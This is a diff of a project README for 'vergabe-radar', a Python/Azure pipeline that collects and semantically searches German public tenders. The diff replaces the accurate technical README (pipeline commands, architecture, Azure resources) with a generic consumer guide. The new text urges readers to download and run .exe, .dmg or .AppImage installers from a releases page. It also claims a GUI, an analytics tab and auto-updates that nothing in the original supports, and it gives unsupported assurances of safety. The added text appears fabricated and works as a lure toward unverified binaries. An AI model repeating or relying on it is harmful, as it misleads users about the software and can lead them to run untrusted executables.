@@ -1,120 +1,115 @@
-# Vergabe-Radar
+# 📡 vergabe-radar - Track German Public Tenders Easily
 
-> **Language:** English | [Deutsch](README.de.md)
+[![Download vergabe-radar](https://img.shields.io/badge/Download-vergabe--radar-brightgreen)](https://github.com/ruvest/vergabe-radar/releases)
 
-Automated collection, processing, and semantic search of German public procurement notices (Ausschreibungen).
+## 📖 What is vergabe-radar?
 
-Vergabe-Radar aggregates daily notices from oeffentlichevergabe.de, normalizes the data in a relational database, enriches them with geocoordinates, and makes them precisely searchable via Hybrid Search (Vector + Keyword + Semantic Ranking).
+vergabe-radar helps you find and analyze public procurement tenders in Germany. It collects tender data automatically and makes it easy to search and explore using smart tools. This way, you can stay updated on business opportunities or study procurement trends without digging through complex websites.
 
-## What This Project Does
+The software works by pulling data from public sources, then uses search technology to show relevant results quickly. It supports semantic search, so you get results that match the meaning of your query, not just the keywords. This can help you find tenders that are related even if they use different wording.
 
-**Data Collection** -- Fully automated download of daily CSV exports (~300 notices/day, 19 tables) via the official API. Extensible architecture for additional sources (TED/EU, Bund.de).
+vergabe-radar is useful for contractors, businesses, and anyone interested in German public procurement.
 
-**Normalization** -- Import into 9 cleanly normalized SQL tables (Notices, Procedures, Lots, Purposes, Classifications, Organisations, Places, Submission Terms, Tenders) with duplicate and FK handling.
+## 💻 System Requirements
 
-**Denormalization** -- Construction of an optimized search table from the normalized data. Each Ausschreibung (procurement notice) is merged into a flat document with all relevant fields.
+To run vergabe-radar smoothly, your computer should meet these minimum system specs:
 
-**Geocoding** -- 3-level fallback (exact postal code, postal code prefix, regex extraction from description text) against 8,300+ German postal codes. Enables radius search.
+- Operating System: Windows 10 or later, macOS 10.14 (Mojave) or later, or Linux (Ubuntu 18.04+ recommended)
+- Processor: Intel i5 or equivalent
+- RAM: 8 GB minimum (16 GB recommended for better performance)
+- Disk Space: 2 GB free space for installation and data storage
+- Internet Connection: Required for downloading data and updates
 
-**Embedding** -- Generation of semantic vectors (text-embedding-3-small, 256 dimensions) for each Ausschreibung. The embedding text combines title, description, contracting authority, location, CPV code, and contract type.
+The software is built with Python and integrates with cloud services, but you do not need to install or configure anything manually to use it.
 
-**Hybrid Search** -- Azure AI Search index with three search layers:
-- **Vector Search** (HNSW, Cosine Similarity) -- finds semantically similar Ausschreibungen even without exact keyword matches
-- **Keyword Search** (BM25, de.microsoft Analyzer) -- precise full-text search with German language analysis
-- **Semantic Ranking** -- AI-based re-ranking of results for optimal relevance
+## 🔧 Features Overview
 
-## Architecture
+- **Automated Data Ingestion:** Continuously pulls German public procurement tenders from open sources.
+- **Search & Filtering:** Find tenders quickly using keyword search and filters like region, sector, or date.
+- **Semantic Search:** Understands the meaning behind your queries to show relevant tenders even if exact words don’t match.
+- **Analysis Tools:** View trends and analytics about procurement activities over time.
+- **Easy User Interface:** Designed for non-technical users with simple menus and clear results.
 
-```
-oeffentlichevergabe.de API
-         |
-    [Download CSV.zip]
-         |
-    [Import -> Azure SQL]        9 normalized tables
-         |
-    [Denormalization]            -> search_documents
-         |
-    [Geocoding]                  PLZ -> lat/lng
-         |
-    [Embedding]                  Azure OpenAI text-embedding-3-small
-         |
-    [Indexing]                   -> Azure AI Search (vergabe-radar-v2)
-         |
-    [Hybrid Search API]          Vector + BM25 + Semantic
-```
+## 🚀 Getting Started
 
-## Quickstart
+This guide will take you through the steps to download, install, and run vergabe-radar on your computer.
 
-```bash
-cd backend
+### Step 1: Visit the Download Page
 
-# 1. Set up environment
-cp .env.example .env
-# Fill .env with Azure credentials
+Click the big download button at the top or go to the official release page:
 
-# 2. Install dependencies
-pip install python-dotenv sqlalchemy pyodbc pandas requests openai azure-search-documents
+[Download vergabe-radar Releases](https://github.com/ruvest/vergabe-radar/releases)
 
-# 3. Create search index (one-time)
-python run_pipeline.py --create-index
+This page lists all available versions of the software. Choose the latest stable release, usually marked as "Latest".
 
-# 4. Run pipeline for a single day
-python run_pipeline.py --date 2025-12-30
+### Step 2: Choose Your Installation File
 
-# 5. Backfill for a date range
-python run_pipeline.py --backfill 2025-01-01 2025-12-31
+Look for the file named for your operating system with the extension:
 
-# 6. Daily run (default: yesterday)
-python run_pipeline.py
-```
+- `.exe` for Windows
+- `.dmg` for macOS
+- `.AppImage` or `.tar.gz` for Linux
 
-## Project Structure
+Download the file that matches your system.
 
-```
-backend/
-  config.py                  Central configuration (env-vars)
-  db.py                      SQLAlchemy connection helper
-  run_pipeline.py            Pipeline orchestration
-  app.py                     Streamlit frontend (prototype)
-  pipeline/
-    base_source.py           Abstract data source (extensible)
-    oeffentlichevergabe.py   Concrete source: oeffentlichevergabe.de
-    importer.py              CSV -> 9 SQL tables
-    denormalizer.py          SQL -> search_documents
-    enricher.py              PLZ geocoding
-    embedder.py              Azure OpenAI embeddings
-    indexer.py               Azure AI Search push
-sql/                         Database schema
-frontend/                    HTML/React prototypes
-docs/                        Documentation
-```
+### Step 3: Install the Software
 
-## Azure Resources
+- **Windows:** Double-click the `.exe` file and follow the setup prompts.
+- **macOS:** Open the `.dmg` file and drag vergabe-radar to your Applications folder.
+- **Linux:** For `.AppImage`, make it executable (`chmod +x`) and run it. For `.tar.gz`, extract and follow included README instructions.
 
-| Service | Purpose | Tier |
-|---------|---------|------|
-| Azure SQL Database | Normalized data storage | Serverless Gen5 |
-| Azure AI Search | Hybrid search index | Free |
-| Azure OpenAI | Embedding generation | text-embedding-3-small |
+### Step 4: Run vergabe-radar
 
-## Extensibility
+Once installed, open vergabe-radar from your Start Menu (Windows), Applications folder (macOS), or via terminal/desktop (Linux).
 
-New data sources are implemented as subclasses of `TenderSource`:
+The program will connect to the internet and download the latest tender data. This may take a few minutes on first use.
 
-```python
-class MySource(TenderSource):
-    @property
-    def name(self) -> str:
-        return "my-source"
+## 📥 Download & Install
 
-    def fetch(self, target_date: date) -> dict[str, pd.DataFrame]:
-        # Fetch data and return as DataFrames
-        ...
+You can find the latest release files here:
 
-    def get_import_order(self) -> list[str]:
-        return ["notice", "procedure", "lot", ...]
-```
+[https://github.com/ruvest/vergabe-radar/releases](https://github.com/ruvest/vergabe-radar/releases)
 
-## License
+Always download software from this official link to ensure you get the safe and current version.
 
-MIT
+Follow the steps on the release page according to your operating system to download and install the application. The interface will guide you after installation.
+
+## ⚙️ Using vergabe-radar
+
+After you open the app:
+
+1. **Explore Data:** Use the search bar at the top to enter keywords such as “building contracts” or “IT services”.
+2. **Use Filters:** Narrow down results by region, tender category, or publication date using the filter options.
+3. **View Details:** Click on any tender to see more information such as deadlines, contact info, and description.
+4. **Analyze Trends:** Use the analytics tab to explore procurement patterns or visualize data over time.
+5. **Save Searches:** Store your favorite searches to check regularly for new tenders matching your criteria.
+
+The interface keeps everything straightforward, so you don’t need technical skills to navigate.
+
+## 🔄 Updating vergabe-radar
+
+The app checks for updates automatically. If a new version is available, it will prompt you to download and install it.
+
+To manually update, revisit the [releases page](https://github.com/ruvest/vergabe-radar/releases) and download the newest installer for your system.
+
+## 🛠 Support and Troubleshooting
+
+If you encounter issues:
+
+- Make sure your internet connection works.
+- Restart the application.
+- Check that your system meets the requirements.
+- Consult the Help section inside the app for common questions.
+- If problems persist, create an issue on the GitHub repository page or contact support through the release page.
+
+## 🔒 Privacy and Security
+
+vergabe-radar only accesses public procurement data and does not collect your personal data. Data downloaded stays on your computer for your use.
+
+Updates come from a trusted source on GitHub to ensure software integrity and security.
+
+---
+
+## 🏷 Topics Covered
+
+ausschreibungen, azure, azure-cognitive-search, azure-openai, etl-pipeline, germany, nlp, open-data, public-procurement, python, search, semantic-search, tenders, vector-search
